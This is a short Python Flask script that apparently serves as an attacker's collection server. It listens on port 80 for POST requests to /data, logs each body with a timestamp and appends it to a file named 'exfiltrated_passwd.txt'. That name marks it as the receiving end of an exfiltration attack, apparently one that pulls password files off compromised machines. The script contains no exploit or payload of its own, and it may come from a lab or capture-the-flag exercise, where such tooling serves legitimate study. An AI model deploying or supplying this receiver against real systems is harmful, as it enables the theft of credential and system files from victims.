from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/data', methods=['POST'])
def receive_data():
    content = request.get_data(as_text=True)
    print(f"[{datetime.now()}] Received:\n{content}\n{'-'*40}")
    with open("exfiltrated_passwd.txt", "a") as f:
        f.write(content + "\n\n")
    return '', 204

app.run(host='0.0.0.0', port=80)
